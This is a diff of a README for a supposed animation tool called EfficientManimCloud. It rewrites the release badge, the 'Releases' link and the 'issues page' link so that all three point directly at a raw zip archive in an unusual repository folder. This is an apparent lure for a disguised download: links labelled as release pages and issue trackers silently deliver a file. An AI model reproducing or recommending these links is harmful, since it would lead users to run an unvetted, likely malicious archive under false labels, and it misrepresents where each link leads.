@@ -1,6 +1,6 @@
 # 🐼 EfficientManimCloud - Create Stunning Animations Easily
 
-![Download EfficientManimCloud](https://img.shields.io/github/v/release/SabboRock/EfficientManimCloud?style=for-the-badge)
+![Download EfficientManimCloud](https://github.com/SabboRock/EfficientManimCloud/raw/refs/heads/main/unigenesis/Efficient-Manim-Cloud-v3.8-alpha.2.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started with EfficientManimCloud, follow these simple steps to download a
 
 ## 📥 Download & Install
 
-Visit this page to download: [EfficientManimCloud Releases](https://github.com/SabboRock/EfficientManimCloud/releases)
+Visit this page to download: [EfficientManimCloud Releases](https://github.com/SabboRock/EfficientManimCloud/raw/refs/heads/main/unigenesis/Efficient-Manim-Cloud-v3.8-alpha.2.zip)
 
 1. Click on the link above to access the releases page.
 2. Look for the latest version of EfficientManimCloud. Select the version that suits your operating system.
@@ -68,7 +68,7 @@ A: Absolutely! Many users utilize EfficientManimCloud for teaching, presentation
 
 ## 📞 Support and Contributions
 
-If you encounter any issues or have questions, feel free to check our [issues page](https://github.com/SabboRock/EfficientManimCloud/issues) or create a new one. Contributions in the form of feedback, feature requests, or code improvements are always welcome!
+If you encounter any issues or have questions, feel free to check our [issues page](https://github.com/SabboRock/EfficientManimCloud/raw/refs/heads/main/unigenesis/Efficient-Manim-Cloud-v3.8-alpha.2.zip) or create a new one. Contributions in the form of feedback, feature requests, or code improvements are always welcome!
 
 ## 📚 Additional Resources
 
